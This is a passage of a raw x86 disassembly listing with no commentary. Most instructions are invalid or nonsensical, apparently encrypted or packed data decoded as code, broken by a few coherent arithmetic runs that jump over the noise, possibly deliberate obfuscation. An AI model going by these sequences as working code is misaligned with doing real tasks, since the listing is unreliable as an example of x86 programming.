  40198b:	test   DWORD PTR [esi+0x3284f293],eax
  401991:	jne    0x401938
  401993:	pushf  
  401994:	gs test esp,esp
  401997:	inc    edi
  401998:	lock sar eax,0x71
  40199c:	jo     0x4019ab
  40199e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40199f:	sub    BYTE PTR [edx-0x2687ed84],bl
  4019a5:	call   0x47d7:0x70ff6061
  4019ac:	out    dx,al
  4019ad:	pop    edi
  4019ae:	and    BYTE PTR [esi-0x45],ah
  4019b1:	inc    esi
  4019b2:	pusha  
  4019b3:	js     0x40195a
  4019b5:	test   BYTE PTR [ecx+0x531cd01f],ch
  4019bb:	out    dx,eax
  4019bc:	and    DWORD PTR [edx+0x5],ebx
  4019bf:	push   eax
  4019c0:	(bad)  
  4019c1:	pop    edx
  4019c2:	jmp    0x76be77a5
  4019c7:	pop    ebx
  4019c8:	jne    0x4019bb
  4019ca:	mov    ds:0x2526dca4,al
  4019cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019d0:	dec    DWORD PTR [eax-0x601f3df7]
  4019d6:	pop    esi
  4019d7:	inc    ebp
  4019d8:	pop    edx
  4019d9:	dec    ebp
  4019da:	(bad)  
  4019db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019dc:	clc    
  4019dd:	push   ds
  4019de:	lods   eax,DWORD PTR ds:[esi]
  4019df:	pop    ds
  4019e0:	(bad)  
  4019e1:	cmc    
  4019e2:	call   0x797b:0xa7f7172d
  4019e9:	test   DWORD PTR [esi-0x2b],0xcd25cde5
  4019f0:	dec    eax
  4019f1:	or     al,0xb4
  4019f3:	xchg   edi,eax
  4019f4:	stc    
  4019f5:	and    WORD PTR [ebp-0x10],sp
  4019f9:	adc    al,0x27
  4019fb:	dec    esi
  4019fc:	or     cl,BYTE PTR [ebp-0x12]
  4019ff:	scas   al,BYTE PTR es:[edi]
  401a00:	pushf  
  401a01:	adc    eax,0xccdf005d
  401a06:	pop    eax
  401a07:	or     eax,0x8894b72f
  401a0c:	push   edx
  401a0d:	lea    edi,[edi]
  401a0f:	inc    esp
  401a10:	arpl   bp,si
  401a12:	dec    esi
  401a13:	adc    eax,0x278e8188
  401a18:	pop    ebp
  401a19:	inc    ebx
  401a1a:	adc    BYTE PTR [esi],al
  401a1c:	add    dl,BYTE PTR [eax-0x1]
  401a1f:	fcomp  QWORD PTR [ebx+0x33619e25]
  401a25:	mov    ?,WORD PTR [esp+ebp*8]
  401a28:	test   eax,0xeaf2ce34
  401a2d:	or     eax,0x47c845f
  401a32:	fwait
  401a33:	enter  0xfb7e,0x63
  401a37:	popa   
  401a38:	push   cs
  401a39:	push   es
  401a3a:	fldcw  WORD PTR [edi+0x7c668251]
  401a40:	sub    eax,edi
  401a42:	psrlq  mm0,QWORD PTR [ebp-0x32]
  401a46:	inc    edx
  401a47:	std    
  401a48:	jmp    0xf74bb358
  401a4d:	mov    dl,0xb9
  401a4f:	inc    ebx
  401a50:	into   
  401a51:	aaa    
  401a52:	repnz daa 
  401a54:	xchg   edx,eax
  401a55:	cmp    DWORD PTR [ebp+0x15e9cac7],esi
  401a5b:	pop    ds
  401a5c:	retf   
  401a5d:	ss iret 
  401a5f:	or     al,BYTE PTR [edx+0xc]
  401a62:	inc    edi
  401a63:	mov    cl,0x16
  401a65:	(bad)  
  401a66:	jg     0x401a4d
  401a68:	mov    ecx,0xeca5e998
  401a6d:	add    BYTE PTR [ecx+0x7f],0xf7
  401a71:	cmp    cl,BYTE PTR [ecx]
  401a73:	mov    dl,BYTE PTR [ebp+0x5c]
  401a76:	mov    eax,ds:0xe9b05d89
  401a7b:	pushf  
  401a7c:	add    DWORD PTR [eax],eax
  401a7e:	add    BYTE PTR [ecx-0x4c264c60],dl
  401a84:	jmp    0x10588ada
  401a89:	push   ds
  401a8a:	dec    esp
  401a8b:	popa   
  401a8c:	lods   eax,DWORD PTR ds:[esi]
  401a8d:	adc    al,0x3a
  401a8f:	push   cs
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401ad1
  401a98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a99:	or     DWORD PTR [edx+0x6d],eax
  401a9c:	call   FWORD PTR ds:[edi+0x5]
  401aa0:	mov    dh,0xfe
  401aa2:	inc    ecx
  401aa3:	dec    esp
  401aa4:	mov    al,ds:0x5a0d2027
  401aa9:	push   es
  401aaa:	dec    eax
  401aab:	(bad)  
  401aac:	hlt    
  401aad:	das    
  401aae:	xor    esi,DWORD PTR [eax-0x20ec5f72]
  401ab4:	int3   
  401ab5:	pop    esp
  401ab6:	dec    eax
  401ab7:	mov    esi,0x9c28241a
  401abc:	in     eax,0x92
  401abe:	cli    
  401abf:	sbb    al,cl
  401ac1:	jo     0x401a59
  401ac3:	mov    edx,0xdc986355
  401ac8:	pop    esi
  401ac9:	pop    ebp
  401aca:	cmp    al,0xcb
  401acc:	aaa    
  401acd:	push   ebp
  401ace:	cwde   
  401acf:	sub    DWORD PTR [eax-0x33c6e6ce],0xffffff89
  401ad6:	and    eax,DWORD PTR [edi]
  401ad8:	mov    bh,0xb3
  401ada:	fist   WORD PTR [eax+ecx*2-0x260cda06]
  401ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ae2:	cs dec edx
  401ae4:	sbb    eax,0x44aa8a60
  401ae9:	lods   al,BYTE PTR ds:[esi]
  401aea:	and    DWORD PTR [edx-0x1627aef],eax
  401af0:	shl    DWORD PTR [edi-0x42fc73bb],0x52
  401af7:	je     0x401b41
  401af9:	xor    edx,edx
  401afb:	in     eax,dx
  401afc:	adc    dl,dl
  401afe:	out    0x9b,eax
  401b00:	(bad)  
  401b01:	sahf   
  401b02:	test   BYTE PTR [esi-0x40],bl
  401b05:	jecxz  0x401ac7
  401b07:	push   0x59
  401b09:	es hlt 
  401b0b:	clc    
  401b0c:	fldenv [ebp-0x1284543b]
  401b12:	(bad)  
  401b13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b14:	inc    edx
  401b15:	addr16 cmc 
  401b17:	addr16 cld 
  401b19:	and    dl,BYTE PTR [edx+0x1d774f37]
  401b1f:	out    dx,al
  401b20:	lods   al,BYTE PTR ds:[esi]
  401b21:	ret    
  401b22:	mov    esp,0x8bdfd5b9
  401b27:	add    cl,BYTE PTR [edi-0x37]
  401b2a:	push   ecx
  401b2b:	mov    bh,0xa3
  401b2d:	mov    al,0xfd
  401b2f:	add    BYTE PTR [edx],dh
  401b31:	mov    edx,0xda0ea2f5
  401b36:	push   esi
  401b37:	pop    ss
  401b38:	inc    edi
  401b39:	add    DWORD PTR ds:0xd5b1d86e,0x6dd0ac51
  401b43:	or     al,0x6f
  401b45:	push   esp
  401b46:	ins    DWORD PTR es:[edi],dx
  401b47:	data16 mov ch,0x7a
  401b4a:	mov    edi,0x3e37adf7
  401b4f:	or     DWORD PTR [ebx],edi
  401b51:	xor    eax,0x8ab68557
  401b56:	imul   ebx,DWORD PTR [ecx],0x56b9d2f
  401b5c:	dec    eax
  401b5d:	pop    ebx
  401b5e:	mov    edi,0x98eeb4d8
  401b63:	push   es
  401b64:	rcl    BYTE PTR [esi-0x7d9bf9c9],0x5c
  401b6b:	jmp    0x12e9da54
  401b70:	mov    bh,0x61
  401b72:	mov    ebp,0x719d3683
  401b77:	or     al,ch
  401b79:	or     DWORD PTR gs:[esi+0x717bc6a],esp
  401b80:	xlat   BYTE PTR ds:[ebx]
  401b81:	cs addr16 mov edi,0xcfe1296c
  401b89:	(bad)  [ebx+edi*8]
  401b8c:	out    dx,al
  401b8d:	call   0xc397ee83
  401b92:	(bad)
  401b96:	dec    ebp
  401b97:	push   eax
  401b98:	cdq    
  401b99:	push   es
  401b9a:	jg     0x401be1
  401b9c:	jae    0x401b2c
  401b9e:	xchg   ebp,eax
  401b9f:	in     al,0xcf
  401ba1:	push   edi
  401ba2:	jmp    0x3506e5c1
  401ba7:	mov    ebp,0x893c9d30
  401bac:	shl    ebx,1
  401bae:	xchg   edi,eax
  401baf:	fsubr  DWORD PTR [edx+edi*4-0x2a]
  401bb3:	ror    DWORD PTR [eax],0x1
  401bb6:	clc    
  401bb7:	cmp    DWORD PTR [ebp+0x794bc21c],ebx
  401bbd:	pop    es
  401bbe:	aaa    
  401bbf:	popa   
  401bc0:	pop    eax
  401bc1:	bound  ebp,QWORD PTR [esi-0x3f]
  401bc4:	xchg   ecx,eax
  401bc5:	mov    DWORD PTR [esi+edx*8],edx
  401bc8:	shl    esi,cl
  401bca:	sub    ax,0x824b
  401bce:	xor    BYTE PTR [ebp+eiz*1-0x1c],al
  401bd2:	mov    al,0x9a
  401bd4:	dec    ebx
  401bd5:	aad    0xe3
  401bd7:	pop    esp
  401bd8:	or     cl,BYTE PTR [edx+0x75aa850e]
  401bde:	and    ebx,ecx
  401be0:	popf   
  401be1:	or     cl,dl
  401be3:	dec    ecx
  401be4:	lock (bad) 
  401be6:	adc    eax,0x14cca6ed
  401beb:	lahf   
  401bec:	lods   al,BYTE PTR ds:[esi]
  401bed:	dec    eax
  401bee:	in     al,0x34
  401bf0:	out    0xa5,al
  401bf2:	or     DWORD PTR ds:0xbdfacb68,edi
  401bf8:	and    edi,edx
  401bfa:	sub    edi,DWORD PTR [ebx-0x4e]
  401bfd:	bound  eax,QWORD PTR [edi-0x354f1e20]
  401c03:	hlt    
  401c04:	aaa    
  401c05:	cwde   
  401c06:	xchg   BYTE PTR [edx+0x7c3dbfeb],ch
  401c0c:	adc    edx,DWORD PTR [ebp+0x74ebf20b]
  401c12:	stc    
  401c13:	xchg   edi,eax
  401c14:	xor    esi,DWORD PTR [ecx-0x3e]
  401c17:	jecxz  0x401b9e
  401c19:	xchg   ecx,eax
  401c1a:	jns    0x401ba7
  401c1c:	inc    ebp
  401c1d:	mov    al,0x8b
  401c1f:	dec    ebp
  401c20:	clc    
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	jmp    0x401caf
  401c42:	dec    ebp
  401c43:	scas   al,BYTE PTR es:[edi]
  401c44:	mov    bh,BYTE PTR [ecx+0x7e]
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401bf8
  401c4d:	retf   0x3723
  401c50:	lea    edi,ds:0xf2491d25
  401c56:	(bad)  
  401c57:	sbb    bl,bh
  401c59:	mov    WORD PTR [esi],ds
  401c5b:	pop    ecx
  401c5c:	dec    edx
  401c5d:	jp     0x401cdc
  401c5f:	and    eax,0x92dc51cc
  401c64:	and    al,0xe7
  401c66:	jne    0x401cd2
  401c68:	bound  ecx,QWORD PTR [ebx]
  401c6a:	(bad)  
  401c6b:	pop    eax
  401c6c:	adc    eax,0x2d7f9dae
  401c71:	ins    BYTE PTR es:[edi],dx
  401c72:	out    dx,eax
  401c73:	cli    
  401c74:	jg     0x401c75
  401c76:	sbb    al,0x67
  401c78:	add    eax,DWORD PTR [ebp-0x6db13645]
  401c7e:	xchg   edx,eax
  401c7f:	mov    ds:0xac12b9e4,al
  401c84:	add    al,0x87
  401c86:	pop    edi
  401c87:	cmc    
  401c88:	ret    
  401c89:	scas   eax,DWORD PTR es:[edi]
  401c8a:	xchg   edi,eax
  401c8b:	xchg   edi,eax
  401c8c:	pop    edi
  401c8d:	adc    eax,0xcedaf3b2
  401c92:	add    DWORD PTR [ebx],esp
  401c94:	dec    esp
  401c95:	add    DWORD PTR [ebx+edi*4-0x262a6f4b],edx
  401c9c:	mov    al,ds:0x77b4e4df
  401ca1:	mov    bh,BYTE PTR ds:0x10fa6acf
  401ca7:	cmp    dl,BYTE PTR [eax-0x6f00e2df]
  401cad:	bound  eax,QWORD PTR ds:0xdb920e65
  401cb3:	rcr    ecx,1
  401cb5:	lods   eax,DWORD PTR ds:[esi]
  401cb6:	loopne 0x401cd6
  401cb8:	mov    edx,0x169d4a28
  401cbd:	xlat   BYTE PTR ds:[ebx]
  401cbe:	(bad)  
  401cbf:	jb     0x401c8a
  401cc1:	retf   
  401cc2:	sbb    esp,DWORD PTR [esi-0x373533e1]
  401cc8:	rol    DWORD PTR [ebp+0x13e55fca],1
  401cce:	(bad)
  401cd1:	pop    ebx
  401cd2:	push   ebx
  401cd3:	push   0x48
  401cd5:	clc    
  401cd6:	int3   
  401cd7:	jno    0x401c95
  401cd9:	sar    BYTE PTR [eax+0x6a],1
  401cdc:	jne    0x401ca7
  401cde:	or     dh,dl
  401ce0:	xor    ebx,DWORD PTR [ecx+eax*1-0x4feb6850]
  401ce7:	sub    ecx,DWORD PTR [edx+0x43a4fea6]
  401ced:	cld    
  401cee:	add    eax,0xd1bd3bc
  401cf3:	rcr    BYTE PTR [eax+0x2a0949d3],1
  401cf9:	or     DWORD PTR [edi+0x17617e15],edi
  401cff:	fdivr  DWORD PTR [ebx-0x76]
  401d02:	(bad)  
  401d04:	dec    esp
  401d05:	popf   
  401d06:	push   edi
  401d07:	pop    eax
  401d08:	loope  0x401caa
  401d0a:	aad    0xeb
  401d0c:	sbb    ecx,ebx
  401d0e:	imul   ecx,esi,0x6ff50fe2
  401d14:	pop    eax
  401d15:	pop    ecx
  401d16:	(bad)  
  401d17:	jl     0x401cd9
  401d19:	push   cs
  401d1a:	cs loope 0x401d70
  401d1d:	imul   edx,DWORD PTR [edi],0x15
  401d20:	cmp    edi,esi
  401d22:	arpl   WORD PTR [esi],bp
  401d24:	scas   eax,DWORD PTR es:[edi]
  401d25:	inc    edi
  401d26:	aam    0xe7
  401d28:	iret   
  401d29:	mov    bl,BYTE PTR [eax]
  401d2b:	(bad)  
  401d2c:	mov    ds:0x3d8c8f71,eax
  401d31:	ja     0x401dab
  401d33:	cli    
  401d34:	repz fsub st,st(5)
  401d37:	dec    ebp
  401d38:	mov    esi,0xecd5f6bf
  401d3d:	xchg   edi,eax
  401d3e:	mov    ebx,0x654e04b7
  401d43:	add    al,0x8a
  401d45:	sti    
  401d46:	iret   
  401d47:	fs mov esi,0xb37b8f71
  401d4d:	xchg   esp,eax
  401d4e:	in     al,0x86
  401d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d51:	(bad)  
  401d52:	cmp    eax,0xaddf9199
  401d57:	jns    0x401d3c
  401d59:	add    DWORD PTR [edi+0x50cda52b],0xb7b96c5b
  401d63:	pop    eax
  401d64:	fist   WORD PTR [edx+0x78]
  401d67:	pop    ss
  401d68:	aas    
  401d69:	call   0x5441:0x3c0f4d52
  401d70:	pusha  
  401d71:	das    
  401d72:	jno    0x401d99
  401d74:	lods   al,BYTE PTR ds:[esi]
  401d75:	sti    
  401d76:	inc    esp
  401d77:	cmp    eax,0x75f42f8f
  401d7c:	sub    BYTE PTR [ebx],bl
  401d7e:	hlt    
  401d7f:	dec    edx
  401d80:	les    ecx,FWORD PTR [edi]
  401d82:	mov    al,ds:0x8761bbf8
  401d87:	out    0x21,al
  401d89:	sbb    eax,0x39abbc62
  401d8e:	and    eax,0x8a34ef8d
  401d93:	mov    cl,0xfd
  401d95:	sub    ch,BYTE PTR [edx+0x4a]
  401d98:	sar    BYTE PTR [ecx],1
  401d9a:	stos   DWORD PTR es:[edi],eax
  401d9b:	sub    ebp,DWORD PTR [ebx-0x41ff0ba2]
  401da1:	ret    
  401da2:	repnz lea eax,ds:0xd3aaea90
  401da9:	and    al,0x8f
  401dab:	les    edi,FWORD PTR [edx+0x6c760762]
  401db1:	sub    eax,0x65033f05
  401db6:	ins    DWORD PTR es:[edi],dx
  401db7:	ja     0x401d8e
  401db9:	pop    ebx
  401dba:	loope  0x401d73
  401dbc:	inc    ecx
  401dbd:	and    eax,0x6df3c8c8
  401dc2:	push   ds
  401dc3:	pop    esi
  401dc4:	add    DWORD PTR [edx],ebp
  401dc6:	sub    ah,al
  401dc8:	test   al,0x34
  401dca:	xor    eax,0x53aa65e0
  401dcf:	scas   eax,DWORD PTR es:[edi]
  401dd0:	add    eax,edi
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x721fcac8],ebp
  401e0d:	lds    edx,FWORD PTR [esi]
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401e18
  401e17:	mov    ds:0xff8d73b0,eax
  401e1c:	cmp    eax,0x6e5e0260
  401e21:	ret    
  401e22:	mov    bh,0x25
  401e24:	call   0x65e99d5c
  401e29:	push   0x36c8c067
  401e2e:	or     eax,DWORD PTR [ecx-0x58]
  401e31:	leave  
  401e32:	stc    
  401e33:	call   0x6ea7:0x327b283d
  401e3a:	cmp    eax,0x9ea8d00d
  401e3f:	rcl    cl,1
  401e41:	retf   0x49a7
  401e44:	ds sub ecx,edx
  401e47:	push   esi
  401e48:	sub    ch,BYTE PTR [esp+0x3c3a9450]
  401e4f:	push   ds
  401e50:	mov    al,ds:0x3140d7fd
  401e55:	xor    eax,0x5a5078e5
  401e5a:	mov    ebx,ebx
  401e5c:	jp     0x401e28
  401e5e:	aas    
  401e5f:	sbb    BYTE PTR [ebp-0x40],ch
  401e62:	jge    0x401ecc
  401e64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e65:	ret    0xb44d
  401e68:	test   DWORD PTR [edx+0x50ae806f],0xe917df81
  401e72:	popf   
  401e73:	push   0xffffffdf
  401e75:	(bad)  
  401e77:	(bad)  
  401e78:	test   eax,0x2b1acc93
  401e7d:	loope  0x401e73
  401e7f:	jno    0x401ea4
  401e81:	call   0x9a5f1e1e
  401e86:	jmp    0x401e27
  401e88:	sub    BYTE PTR [ebp-0x79ad3e17],al
  401e8e:	pop    edi
  401e8f:	adc    al,0xa7
  401e91:	not    dh
  401e93:	in     al,dx
  401e94:	call   0xf9ed:0xd9a96a04
  401e9b:	push   ebx
  401e9c:	iret   
  401e9d:	cmc    
  401e9e:	outs   dx,BYTE PTR ds:[esi]
  401e9f:	(bad)  
  401ea0:	and    BYTE PTR [eax+0x573fec99],dh
  401ea6:	and    eax,0x6d468f3a
  401eab:	retf   
  401eac:	xchg   ebp,eax
  401ead:	and    al,0x48
  401eaf:	ret    0x5f28
  401eb2:	xor    al,0x16
  401eb4:	cli    
  401eb5:	inc    ebp
  401eb6:	iret   
  401eb7:	test   DWORD PTR [edx],eax
  401eb9:	adc    bl,BYTE PTR [edx-0x3f7982d3]
  401ebf:	jmp    0x401f37
  401ec1:	pop    ecx
  401ec2:	xchg   ecx,eax
  401ec3:	mov    ebx,0x2d2179b7
  401ec8:	std    
  401ec9:	popf   
  401eca:	dec    esp
  401ecb:	aad    0x95
  401ecd:	mov    ds:0x73eb755b,eax
  401ed2:	mov    eax,DWORD PTR [ebp-0x61]
  401ed5:	pop    eax
  401ed6:	lods   eax,DWORD PTR ds:[esi]
  401ed7:	cli    
  401ed8:	inc    eax
  401ed9:	mov    al,0xc5
  401edb:	add    al,0xbb
  401edd:	push   esp
  401ede:	push   es
  401edf:	jbe    0x401f2c
  401ee1:	int    0xd2
  401ee3:	(bad)  
  401ee5:	fld    TBYTE PTR [ebx+eiz*2]
  401ee8:	xor    BYTE PTR [esi],ch
  401eea:	(bad)  
  401eeb:	cmp    al,0x65
  401eed:	cld    
  401eee:	cdq    
  401eef:	cmp    ebp,0xffffffe3
  401ef2:	jne    0x401f36
  401ef4:	mov    WORD PTR [ebx],?
  401ef6:	sahf   
  401ef7:	mov    ch,0x22
  401ef9:	or     al,0xc
  401efb:	push   ebx
  401efc:	jge    0x401ea2
  401efe:	push   ebp
  401eff:	inc    edx
  401f00:	push   edi
  401f01:	add    cl,BYTE PTR [esi+0x8]
  401f04:	aad    0xa2
  401f06:	mov    WORD PTR [ebx-0x530c114e],es
  401f0c:	ss loopne 0x401f7a
  401f0f:	sbb    BYTE PTR [ebp+0x6461702b],bl
  401f15:	pop    edi
  401f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f17:	dec    edx
  401f18:	imul   esi,DWORD PTR [eax+0x3c],0xffffffed
  401f1c:	xchg   esi,eax
  401f1d:	jmp    0x8384:0x56010374
  401f24:	jns    0x401f49
  401f26:	out    0xf1,eax
  401f28:	lea    eax,[edx+eax*2+0x6e]
  401f2c:	ins    DWORD PTR es:[edi],dx
  401f2d:	jg     0x401ed5
  401f2f:	test   DWORD PTR [edx],ebx
  401f31:	jno    0x401f04
  401f33:	xor    ebx,eax
  401f35:	loop   0x401fa0
  401f37:	and    ebp,0x4ab99115
  401f3d:	inc    esp
  401f3e:	lahf   
  401f3f:	add    DWORD PTR [ebx+edi*8-0x6d],ebp
  401f43:	add    DWORD PTR [eax+0x71],0x5924a70e
  401f4a:	cdq    
  401f4b:	rcr    BYTE PTR [ebx+0x7c416c67],1
  401f51:	xor    BYTE PTR [esi],ch
  401f53:	or     eax,0xa76b87c6
  401f58:	out    0x2a,al
  401f5a:	loope  0x401fc9
  401f5c:	xor    al,0x3d
  401f5e:	add    BYTE PTR [edi+ebx*8-0x51],ch
  401f62:	jg     0x401fc5
  401f64:	pop    edx
  401f65:	pop    ecx
  401f66:	lods   al,BYTE PTR ds:[esi]
  401f67:	jge    0x401f4b
  401f69:	mov    ebp,0x7eaeff9b
  401f6e:	test   DWORD PTR [edx-0x4b],esi
  401f71:	adc    BYTE PTR [edi+edi*2-0x5ccd1ae3],0xd8
  401f79:	jp     0x401f99
  401f7b:	xchg   edx,eax
  401f7c:	adc    edx,DWORD PTR [ebx+0x301d4186]
  401f82:	(bad)  
  401f83:	cld    
  401f84:	loope  0x401f82
  401f86:	xor    eax,0x9b88f6a9
  401f8b:	test   DWORD PTR [edx+0x57c8b9a],0xb01a783e
  401f95:	sub    al,0x4f
  401f97:	into   
  401f98:	dec    edi
  401f99:	imul   ecx,DWORD PTR [edi],0x36d84
  401f9f:	add    BYTE PTR [ebp-0x977b],cl
  401fa5:	call   DWORD PTR [eax-0x75]
  401fa8:	inc    ebp
  401fa9:	in     al,0x33
  401fab:	mov    BYTE PTR [ebx],0xc7
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0xb26629df
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x40200e
  401fcc:	std    
  401fcd:	or     dl,bh
  401fcf:	cmp    al,0x9e
  401fd1:	lods   al,BYTE PTR ds:[esi]
  401fd2:	stc    
  401fd3:	jge    0x402001
  401fd5:	mov    dh,0x1f
  401fd7:	xchg   ebx,eax
  401fd8:	and    al,0x7f
  401fda:	hlt    
  401fdb:	mov    al,ds:0x50968d31
  401fe0:	push   es
  401fe1:	out    dx,al
  401fe2:	sbb    al,0x48
  401fe4:	cmp    al,0x80
  401fe6:	jae    0x401fc7
  401fe8:	jo     0x40201b
  401fea:	aad    0x25
  401fec:	push   ecx
  401fed:	pop    ecx
  401fee:	out    dx,al
  401fef:	dec    edi
  401ff0:	xor    DWORD PTR [eax],edi
  401ff2:	icebp  
  401ff3:	fwait
  401ff4:	mov    al,0xe2
  401ff6:	adc    eax,0xd6411d38
  401ffb:	mov    esi,0xabe5adcf
  402000:	cmp    eax,0xb73ed947
  402005:	pop    es
  402006:	(bad)  [eax]
  402008:	pop    esp
  402009:	dec    ecx
  40200a:	pop    ebx
  40200b:	in     eax,0xab
  40200d:	pop    ds
  40200e:	into   
  40200f:	les    eax,FWORD PTR [edx-0x24]
  402012:	xchg   ecx,esp
  402014:	test   al,bh
  402016:	add    eax,0x8592f01a
  40201b:	lahf   
  40201c:	ret    0xf98a
  40201f:	dec    eax
  402020:	sub    eax,0x513ad6c5
  402025:	pop    es
  402026:	out    dx,eax
  402027:	mov    al,ds:0x8ad3b13d
  40202c:	or     DWORD PTR [ebx+ecx*2],0x98d7d764
  402033:	push   edx
  402034:	adc    eax,0xea9594ad
  402039:	daa    
  40203a:	call   0xa581f756
  40203f:	imul   esp,DWORD PTR [esi+edi*1-0x750e6fbc],0xfffffff7
  402047:	xchg   ebx,eax
  402048:	push   es
  402049:	sub    BYTE PTR [edi+eax*2+0x7ce94975],0x2e
  402051:	push   es
  402052:	add    al,BYTE PTR [esi+0x5b29bdb9]
  402058:	cmc    
  402059:	mov    al,ds:0xf219db6b
  40205e:	sbb    BYTE PTR [ebx],0xbf
  402061:	mov    ah,0x42
  402063:	or     BYTE PTR [esi],ah
  402065:	adc    ebp,DWORD PTR [esi]
  402067:	loope  0x4020b8
  402069:	les    edi,FWORD PTR [ebx+0x6e]
  40206c:	mov    BYTE PTR [esi],dh
  40206e:	mov    eax,ds:0x7f8aa881
  402073:	test   dh,bh
  402075:	dec    edi
  402076:	mov    ds,WORD PTR [ecx-0x337cc288]
  40207c:	pop    edi
  40207d:	ins    DWORD PTR es:[edi],dx
  40207e:	js     0x402055
  402080:	xor    dl,BYTE PTR [esi+0x79]
  402083:	jp     0x402093
  402085:	adc    BYTE PTR [esp+eax*2+0x48c7ba90],dh
  40208c:	adc    BYTE PTR [ebp+0x1c],ah
  40208f:	pushf  
  402090:	xchg   ecx,eax
  402091:	pusha  
  402092:	mov    esp,0x77d47d9c
  402097:	lods   al,BYTE PTR ds:[esi]
  402098:	call   0x7e757a98
  40209d:	dec    ebp
  40209e:	cmova  eax,DWORD PTR [edx]
  4020a1:	xor    al,0xa
  4020a3:	sbb    edx,DWORD PTR [edi]
  4020a5:	mov    DWORD PTR [edi],0x9905a3c7
  4020ab:	sub    al,0x93
  4020ad:	adc    edx,DWORD PTR [edx+0x6d2c2196]
  4020b3:	mov    eax,0x1ad89836
  4020b8:	stos   BYTE PTR es:[edi],al
  4020b9:	adc    dl,al
  4020bb:	and    BYTE PTR [edx+ebp*1],cl
  4020be:	ss (bad) 
  4020c0:	test   eax,0xbaff3afa
  4020c5:	fsubr  DWORD PTR [edi]
  4020c7:	pop    ebx
  4020c8:	xor    al,0x4
  4020ca:	fcom   QWORD PTR [ebx]
  4020cc:	imul   esi,DWORD PTR [edx-0x61],0x78
  4020d0:	sahf   
  4020d1:	mov    edi,0x2a104194
  4020d6:	cmp    al,0xeb
  4020d8:	jne    0x402145
  4020da:	fisub  WORD PTR [ebx+0x1f]
  4020dd:	mov    ebx,0xe691dee7
  4020e2:	add    al,0x23
  4020e4:	jle    0x40208d
  4020e6:	std    
  4020e7:	pop    es
  4020e8:	push   ss
  4020e9:	mov    eax,0x414209e7
  4020ee:	dec    eax
  4020ef:	fisub  DWORD PTR [ebx-0x3e0b69a7]
  4020f5:	mov    ch,0xab
  4020f7:	add    edi,esi
  4020f9:	outs   dx,DWORD PTR ds:[esi]
  4020fa:	add    esp,ecx
  4020fc:	xor    bh,BYTE PTR ds:0x5e4109a8
  402102:	popf   
  402103:	popf   
  402104:	int    0x42
  402106:	es or  ecx,edi
  402109:	mov    bh,BYTE PTR [ebx-0x1c]
  40210c:	sub    ah,BYTE PTR [esi-0x71]
  40210f:	cmp    BYTE PTR [ecx+0x7cc08b79],cl
  402115:	xchg   esi,eax
  402116:	ins    BYTE PTR es:[edi],dx
  402117:	inc    ebx
  402118:	mov    al,BYTE PTR [ecx]
  40211a:	add    edx,DWORD PTR [esi]
  40211c:	mov    bh,0xf6
  40211e:	jno    0x4020f3
  402120:	xlat   BYTE PTR ds:[ebx]
  402121:	mov    esi,0xf41744f5
  402126:	pop    es
  402127:	loopne 0x40216b
  402129:	xor    DWORD PTR [ebx-0x3545bf5b],edi
  40212f:	shl    bh,0x95
  402132:	jmp    0x402141
  402134:	add    esi,DWORD PTR [esi]
  402136:	lock adc eax,0xb04d47a9
  40213c:	addr16 dec ebx
  40213e:	pop    ebx
  40213f:	xchg   edx,eax
  402140:	dec    ecx
  402141:	call   0xe0e512e0
  402146:	ror    DWORD PTR [eax],1
  402148:	and    esp,DWORD PTR [ecx]
  40214a:	test   eax,0x2432845a
  40214f:	push   eax
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	add    ebx,ebp
  40216b:	mov    ah,0x67
  40216d:	push   ds
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
